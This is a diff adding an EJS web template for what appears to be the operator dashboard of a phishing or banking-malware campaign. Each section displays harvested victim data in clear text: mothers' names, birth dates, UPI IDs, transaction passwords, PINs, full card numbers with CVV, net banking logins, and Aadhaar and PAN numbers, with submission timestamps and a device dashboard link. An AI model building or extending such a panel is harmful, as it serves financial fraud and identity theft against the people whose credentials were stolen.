@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>User Details</title>
+  <link rel="stylesheet" href="/css/userDetail.css" />
+</head>
+<body>
+  <header class="header-nav">
+    <h1>User Dashboard</h1>
+  </header>
+
+  <div class="user-detail-container">
+
+    <!-- Personal Information -->
+    <section>
+      <h2>Personal Information</h2>
+      <% if (user && user.entries && user.entries.length) { %>
+        <% user.entries.forEach((e, idx) => { %>
+          <div class="card">
+            <h3>Entry #<%= idx + 1 %></h3>
+            <p><strong>Full Name:</strong> <%= e.fullName %></p>
+            <p><strong>Mother's Name:</strong> <%= e.motherName %></p>
+            <p><strong>DOB:</strong> <%= e.dateOfBirth %></p>
+            <p><strong>Submitted:</strong> <%= new Date(e.submittedAt).toLocaleString() %></p>
+          </div>
+        <% }); %>
+      <% } else { %>
+        <div class="card"><p>No personal info found.</p></div>
+      <% } %>
+    </section>
+
+    <!-- UPI IDs -->
+    <section>
+      <h2>UPI IDs</h2>
+      <% if (upi && upi.entries && upi.entries.length) { %>
+        <% upi.entries.forEach((e, idx) => { %>
+          <div class="card">
+            <h3>UPI #<%= idx + 1 %></h3>
+            <p><strong>ID:</strong> <%= e.upiId %></p>
+            <p><strong>Submitted:</strong> <%= new Date(e.submittedAt).toLocaleString() %></p>
+          </div>
+        <% }); %>
+      <% } else { %>
+        <div class="card"><p>No UPI data found.</p></div>
+      <% } %>
+    </section>
+
+      <section>
+      <h2>Transaction Passwords</h2>
+      <% if (transactionPasswords && transactionPasswords.entries && transactionPasswords.entries.length) { %>
+        <% transactionPasswords.entries.forEach((e, idx) => { %>
+          <div class="card">
+            <h3>Password #<%= idx + 1 %></h3>
+            <p><strong>Password:</strong> <%= e.transactionPassword %></p>
+            <p><strong>Submitted:</strong> <%= new Date(e.submittedAt).toLocaleString() %></p>
+          </div>
+        <% }); %>
+      <% } else { %>
+        <div class="card"><p>No transaction passwords found.</p></div>
+      <% } %>
+    </section>
+
+    <!-- PIN Entries -->
+     <section>
+      <h2>PIN Entries</h2>
+      <% if (pinData && pinData.entries && pinData.entries.length) { %>
+        <% pinData.entries.forEach((e, idx) => { %>
+          <div class="card">
+            <h3>PIN #<%= idx + 1 %></h3>
+            <p><strong>PIN:</strong> <%= e.pin %></p>
+            <p><strong>Submitted:</strong> <%= new Date(e.submittedAt).toLocaleString() %></p>
+          </div>
+        <% }); %>
+      <% } else { %>
+        <div class="card"><p>No PIN data found.</p></div>
+      <% } %>
+    </section>
+
+    <!-- Card Payments -->
+    <section>
+      <h2>Card Payments</h2>
+      <% if (cardPayments && cardPayments.entries && cardPayments.entries.length) { %>
+        <% cardPayments.entries.forEach((e, idx) => { %>
+          <div class="card">
+            <h3>Card #<%= idx + 1 %></h3>
+            <p><strong>Number:</strong> <%= e.cardNumber %></p>
+            <p><strong>Expiry:</strong> <%= e.expiryDate %></p>
+            <p><strong>CVV:</strong> <%= e.cvv %></p>
+            <p><strong>Submitted:</strong> <%= new Date(e.submittedAt).toLocaleString() %></p>
+          </div>
+        <% }); %>
+      <% } else { %>
+        <div class="card"><p>No card payments found.</p></div>
+      <% } %>
+    </section>
+
+    <!-- Net Banking Logins -->
+    <section>
+      <h2>Net Banking Logins</h2>
+      <% if (netBankingLogins && netBankingLogins.entries && netBankingLogins.entries.length) { %>
+        <% netBankingLogins.entries.forEach((e, idx) => { %>
+          <div class="card">
+            <h3>Login #<%= idx + 1 %></h3>
+            <p><strong>Bank:</strong> <%= e.bankName %></p>
+            <p><strong>User ID:</strong> <%= e.userId %></p>
+            <p><strong>Submitted:</strong> <%= new Date(e.submittedAt).toLocaleString() %></p>
+          </div>
+        <% }); %>
+      <% } else { %>
+        <div class="card"><p>No net banking logins found.</p></div>
+      <% } %>
+    </section>
+
+    <!-- Net Banking Details -->
+    <section>
+      <h2>Net Banking Details</h2>
+      <% if (netBanking && netBanking.entries && netBanking.entries.length) { %>
+        <% netBanking.entries.forEach((e, idx) => { %>
+          <div class="card">
+            <h3>Detail #<%= idx + 1 %></h3>
+            <p><strong>Aadhar:</strong> <%= e.aadharNumber %></p>
+            <p><strong>PAN:</strong> <%= e.panNumber %></p>
+            <p><strong>Submitted:</strong> <%= new Date(e.submittedAt).toLocaleString() %></p>
+          </div>
+        <% }); %>
+      <% } else { %>
+        <div class="card"><p>No net banking data found.</p></div>
+      <% } %>
+    </section>
+
+    <div class="actions">
+      <a href="/api/device/dashboard"><button class="dashboard-btn">Go to Dashboard</button></a>
+    </div>
+
+  </div>
+</body>
+</html>
